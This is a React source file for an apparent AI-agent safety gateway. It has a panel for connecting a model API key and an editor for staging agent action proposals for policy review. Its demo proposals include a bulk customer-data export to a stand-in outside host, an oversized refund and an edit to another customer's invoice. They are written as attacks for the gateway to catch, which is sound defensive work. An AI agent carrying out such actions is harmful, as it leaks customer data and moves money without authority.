"use client";

import { useEffect, useRef, useState } from "react";
import { ArrowRight, Code2, KeyRound, LoaderCircle, LockKeyhole, Plug, ShieldCheck, Unplug } from "lucide-react";
import { modelProviders, modelProvider, type ModelProvider } from "@/lib/support/model-providers";
import type { ConnectionStatus } from "@/lib/support/model-connection";
import type { SupportPlan, SupportTicket } from "@/lib/support/types";

async function json<T>(response: Response): Promise<T> {
  let body: T & { error?: string };
  try { body = await response.json(); } catch { throw new Error("The server returned an unreadable response."); }
  if (!response.ok) throw new Error(body.error ?? "The request could not be completed.");
  return body;
}

export function ModelConnect({ ticket, disabled, onConnected, onContinue, onProposed }: {
  ticket?: SupportTicket; disabled: boolean;
  onConnected: () => Promise<void>; onContinue: () => void; onProposed: (plan: SupportPlan) => void;
}) {
  const [connection, setConnection] = useState<ConnectionStatus | null>(null);
  const [provider, setProvider] = useState<ModelProvider>("gemini");
  const [model, setModel] = useState<string>(modelProviders[0].defaultModel);
  const [apiKey, setApiKey] = useState("");
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");
  const lock = useRef(false);
  useEffect(() => {
    const controller = new AbortController();
    fetch("/api/model-connection", { cache: "no-store", signal: controller.signal })
      .then(response => json<{ connection: ConnectionStatus }>(response))
      .then(data => { if (!controller.signal.aborted) setConnection(data.connection); })
      .catch(() => { if (!controller.signal.aborted) setError("Connection status could not load. Refresh the workspace, or disconnect an expired connection."); });
    return () => controller.abort();
  }, []);

  async function updateConnection(disconnect = false) {
    if (lock.current) return;
    lock.current = true; setBusy(true); setError("");
    try {
      const response = await fetch("/api/model-connection", disconnect ? { method: "DELETE" } : {
        method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ provider, model: model.trim(), apiKey }),
      });
      const data = await json<{ connection: ConnectionStatus }>(response);
      setConnection(data.connection);
      await onConnected();
    } catch (failure) { setError(failure instanceof Error ? failure.message : "Connection failed. No model actions executed."); }
    finally { setApiKey(""); setBusy(false); lock.current = false; }
  }

  return <div className="apx-connect-layout">
    <section className="apx-panel apx-connect-card">
      <span className="workspace-kicker">YOUR MODEL / SAME EXECUTION GATEWAY</span><h2>Connect a model</h2>
      <p>Choose your provider, enter a model ID, and paste its API key. APX will check its tool-calling support before using it for this workspace.</p>
      <div className={`apx-connection-status ${connection?.source === "session" ? "connected" : ""}`}><Plug size={19} /><div><b>{connection?.source === "session" ? "Your model is connected" : connection?.source === "server" ? "Using the configured demo model" : "No personal model connected"}</b><small>{connection?.connected ? `${modelProvider(connection.provider)?.label ?? connection.provider} / ${connection.model}` : "Connect below, or use deterministic replay."}{connection?.expiresAt && ` · expires ${new Date(connection.expiresAt).toLocaleTimeString()}`}</small></div></div>
      <form onSubmit={event => { event.preventDefault(); void updateConnection(); }}>
        <div className="apx-connect-fields"><label className="apx-field"><span>Provider</span><select value={provider} disabled={disabled || busy} onChange={event => { const next = event.target.value as ModelProvider; setProvider(next); setModel(modelProvider(next)?.defaultModel ?? ""); setApiKey(""); }}>{modelProviders.map(item => <option key={item.id} value={item.id}>{item.label}</option>)}</select></label>
        <label className="apx-field"><span>Model ID</span><input value={model} disabled={disabled || busy} onChange={event => setModel(event.target.value)} maxLength={150} required placeholder={provider === "openrouter" ? "provider/model-name" : "Model ID from your provider"} spellCheck={false} /></label></div>
        <label className="apx-field"><span><KeyRound size={13} /> API key</span><input type="password" value={apiKey} onChange={event => setApiKey(event.target.value)} disabled={disabled || busy} maxLength={512} autoComplete="off" data-lpignore="true" required placeholder="Paste your provider API key here" /></label>
        <p className="apx-connect-security"><LockKeyhole size={14} />Your key is encrypted in an HttpOnly cookie that JavaScript cannot read. It expires after one hour, is bound to your signed-in account, and never enters plans or audit records.</p>
        <p className="apx-connect-probe">Test &amp; connect sends one small synthetic tool-call request to the selected provider. Provider charges or rate limits may apply. No customer data is used for this test.</p>
        {error && <p className="apx-alert apx-alert-error" role="alert">{error}</p>}
        {connection && !connection.canConnect && <p className="apx-alert apx-alert-error">Personal connections need MODEL_CONNECTION_SECRET configured on this server.</p>}
        <div className="apx-connect-actions"><button type="submit" className="apx-button apx-button-primary" disabled={disabled || busy || !model.trim() || apiKey.trim().length < 10 || connection?.canConnect === false}>{busy ? <LoaderCircle size={15} className="apx-spin" /> : <Plug size={15} />} {busy ? "Checking…" : "Test & connect"}</button>{(connection?.source === "session" || error) && <button type="button" className="apx-button" disabled={disabled || busy} onClick={() => void updateConnection(true)}><Unplug size={14} />Disconnect</button>}</div>
      </form>
      {connection?.connected && <button className="apx-text-button" disabled={disabled || busy} onClick={onContinue}>Use this model in Planner<ArrowRight size={14} /></button>}
    </section>
    <aside className="apx-panel apx-connect-card apx-connect-boundary"><span className="workspace-kicker">WHAT IS PROTECTED</span><h2>Model → proposal → policy → review</h2><div className="apx-connect-shield"><ShieldCheck size={38} /></div><p>Your model can read the assigned sandbox invoice and propose actions. APX checks customer scope, refunds, recipients, secret payloads, and tool budgets. Writes remain staged until reviewed.</p><dl><div><dt>Assigned customer</dt><dd>{ticket?.customerName ?? "Select a request"}</dd></div><div><dt>Invoice scope</dt><dd>{ticket?.invoiceId ?? "No invoice selected"}</dd></div><div><dt>Execution</dt><dd>Sandbox connectors only</dd></div></dl><p className="apx-connect-limit">This protects actions routed through APX in this workspace. It does not secure unrelated applications, data already sent to a provider, model weights, or tools that bypass the gateway. Real databases and tools need scoped connector integration.</p><p>Groq and OpenRouter let you connect supported open and commercial models. The selected model must support function calling. Other agents can submit proposals below.</p></aside>
    <ExternalProposals ticket={ticket} disabled={disabled || busy} onProposed={onProposed} />
  </div>;
}

type Example = "safe" | "cross-customer" | "over-limit" | "export";
function exampleActions(ticket: SupportTicket, example: Example) {
  const reply = { id: "external-reply", type: "send_reply", to: ticket.customerEmail, subject: "Your invoice request", body: `Hello ${ticket.customerName}, we will help you review your invoice request.` };
  const attack = example === "export" ? { id: "bulk-export", type: "export_customers", tenantId: ticket.tenantId, destination: "https://outside.example.test/export" }
    : example === "over-limit" ? { id: "excessive-refund", type: "refund", invoiceId: ticket.invoiceId, amountCents: 99900 }
    : { id: "outside-invoice", type: "update_invoice", invoiceId: "inv-another-customer", status: "resolved" };
  return JSON.stringify(example === "safe" ? [reply] : [attack, reply], null, 2);
}

function ExternalProposals({ ticket, disabled, onProposed }: { ticket?: SupportTicket; disabled: boolean; onProposed: (plan: SupportPlan) => void }) {
  const [example, setExample] = useState<Example>("safe");
  const [proposal, setProposal] = useState("");
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");
  const lock = useRef(false);
  useEffect(() => { setExample("safe"); setProposal(ticket ? exampleActions(ticket, "safe") : "[]"); setError(""); }, [ticket?.id]);
  async function stage() {
    if (!ticket || lock.current) return;
    lock.current = true; setBusy(true); setError("");
    try {
      const actions: unknown = JSON.parse(proposal);
      if (!Array.isArray(actions) || !actions.length || actions.length > 8) throw new Error("Provide between 1 and 8 actions in a JSON array.");
      const data = await json<{ plan: SupportPlan }>(await fetch("/api/execution/plans", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ ticketId: ticket.id, actions }) }));
      onProposed(data.plan);
    } catch (failure) { setError(failure instanceof SyntaxError ? "Enter a valid JSON array of action proposals." : failure instanceof Error ? failure.message : "Proposal submission failed."); }
    finally { lock.current = false; setBusy(false); }
  }
  return <details className="apx-panel apx-external-proposals"><summary><Code2 size={18} /><span><b>Bring an existing agent</b><small>Advanced: submit its action proposals through the same review workflow.</small></span></summary><div><p>Any model can supply typed action proposals. This editor stages them for the assigned request; it does not connect your other application automatically. Server-owned permissions and strict review still apply.</p><label className="apx-field"><span>Example proposal</span><select value={example} disabled={disabled || busy || !ticket} onChange={event => { const next = event.target.value as Example; setExample(next); if (ticket) setProposal(exampleActions(ticket, next)); }}><option value="safe">Safe reply</option><option value="cross-customer">Another customer&apos;s invoice</option><option value="over-limit">Excessive refund + safe reply</option><option value="export">Bulk export + safe reply</option></select></label><label className="apx-field"><span>Action proposals (JSON array)</span><textarea value={proposal} disabled={disabled || busy} onChange={event => setProposal(event.target.value)} maxLength={10000} spellCheck={false} /></label>{error && <p className="apx-alert apx-alert-error" role="alert">{error}</p>}<div className="apx-connect-actions"><button className="apx-button apx-button-primary" disabled={disabled || busy || !ticket || !proposal.trim()} onClick={() => void stage()}>{busy ? "Staging…" : "Stage proposal & review"}<ArrowRight size={14} /></button><button className="apx-button" disabled={disabled || busy || !ticket} onClick={() => ticket && setProposal(exampleActions(ticket, example))}>Reset example</button></div><p className="apx-connect-probe">POST /api/execution/plans · signed-in session · no effects during staging</p></div></details>;
}
